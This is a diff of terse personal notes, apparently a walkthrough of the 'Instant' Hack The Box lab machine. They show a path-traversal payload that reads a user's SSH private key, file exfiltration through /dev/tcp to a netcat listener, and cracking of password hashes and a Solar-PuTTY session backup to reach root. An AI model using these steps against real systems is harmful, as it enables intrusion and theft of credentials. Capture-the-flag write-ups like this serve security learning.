@@ -1,3 +1,5 @@
+---------------Get user shell----------------------
+
 download apk file from website
 jadx -d <output directory> <absolute path to file>
 grep -Roi [a-b0-9\<\>].*\.instant.htb <output directory> : Check subdomains -> swagger-ui, mywalletv1
@@ -9,6 +11,42 @@ Check <output directory>/sources/com/instantlabs/instant/AdminActivities.java
 - TestAdminAuthorization .addHeader(<jwt for admin>) : copy admin jwt
 Authorize using new jwt -> list user api possible
 burpsuite - read log api packet
-log_file_name=../../../../../..//home/shirohige/.ssh/id_rsa : get private key
+log_file_name=../../../../../..//home/shirohige/.ssh/id_rsa : get private key(file disclosure vulnerability)
 chmod 600 <private_key>
 ssh -i <private key> shirohige@<ip>
+
+----------------Get admin shell------------------------
+method #1
+remote:
+cd /etc/apache2/sites-enabled
+cat 000-default.conf | grep -v '\#':Show valid config
+cat instant-app.conf, cat swagger-ui.conf: port 8888, 8808
+ss -lntp | grep 88: get pid for 8888, 8808
+ps -ef | grep 1338, ps -ef | grep 1331: both same location ~/projects/mywallet...
+cd ~/projects/mywallet/Instant-Api
+mywallet/serve.py: verify it's flask, from werkzeug.security import generate_password_hash(We need to crack werkzeug)
+find . -name *.db: find instant.db
+cat <instant.db file loc> > /dev/tcp/<my ip>/<port>, nc -lnvp <port>: Download instant.db
+
+local:
+sqlite3 instant.db .dump: verify hash
+sqlite3 instant.db; .schema; select username, password from wallet_users; -> save
+google hashcat crack werkzeug -> copy python program to convert
+hashcat <file> --user <rockyou.txt>
+
+method #2
+remote:
+cd /opt/backups/Solar-PuTTY
+cat sessions-backup.dat | base64 -d|xxd: fail
+cat sessions-backup.dat > /dev/tcp/<ip>/<port> ; 
+
+local:
+nc -nlvp <port>
+google solar putty cracker github: look for python program
+git clone <SolarPuttyCracker>; pip3 install -r requirements.txt;
+python3 SolarPuttyCracker.py -w <rockyou.txt> <sessions-backup.dat>
+cat <decrypted file>: root & password
+ssh root@<ip>: Not work(Require /etc/ssh/sshd_config: PermitRootLogin yes)
+
+remote:
+su -: enter password -> root shell
